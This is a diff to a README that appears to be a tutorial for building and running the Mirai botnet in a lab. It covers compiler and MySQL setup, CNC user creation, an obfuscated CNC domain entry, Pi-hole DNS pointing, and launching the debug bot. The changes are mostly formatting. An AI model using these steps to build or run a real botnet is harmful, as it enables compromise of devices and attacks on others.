@@ -22,6 +22,8 @@ sudo apt install gcc golang electric-fence mysql-server mysql-client screen -y
 ```
 sudo bash ./tools/compilers.sh
 ```
+<br>
+
 To finish the installation put following at the end of /etc/bash.bashrc or ~/.bashrc
 ```
 export PATH=$PATH:/etc/xcompile/armv4l/bin
@@ -67,6 +69,8 @@ First of all run and make sure to allow root login and don't forget the password
 ```
 sudo mysql_secure_installation
 ```
+<br>
+
 Now run:
 ```
 sudo mysql
@@ -76,6 +80,8 @@ Then type:
 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'insert_password';
 exit;
 ```
+<br>
+
 Now test it with:
 ```
 sudo mysql -p
@@ -99,11 +105,13 @@ mysql>
 
 Now type 'exit;' again to exit mysql!
 ```
+<br>
 
 Now it's time to create the database run:
 ```
 cat ./tools/db.sql | sudo mysql -p
 ```
+<br>
 
 The last step of creating the database is to add an cnc user account:
 ```
@@ -116,6 +124,11 @@ exit;
 ```
 <br>
 
+Now restart mysql:
+```
+sudo systemctl restart mysql
+```
+<br>
 ### Now we need to change some settings we will begin with the domain.  
 You can use whatever domain you like we will register it later using piole.
 ```
@@ -138,6 +151,7 @@ In my case i need to change it to:
 
 add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x46\x47\x22", 18);
 ```
+<br>
 
 Now open bot/resolv.c favorite code editor and find the line and change the ip to the ip of your pihole installation
 ```
@@ -166,6 +180,7 @@ const DatabasePass string   = "lol_you_want_to_know_this"
 bash ./build.sh debug telnet
 cp prompt.txt ./debug/.
 ```
+<br>
 
 ### Now its time to setup pihole
 To do this you need to login into pihole and go to Local DNS/DNS Records and type in the domain you used earlier in this tutorial and the ip of the server where the cnc is supposed to run on. **Don't forget to click on add!**
@@ -184,6 +199,7 @@ To run a bot use:
 cd debug
 screen -S mirai-bot sudo ./mirai.dbd
 ```
+<br>
 
 To connect to the cnc using telnet use:
 ```
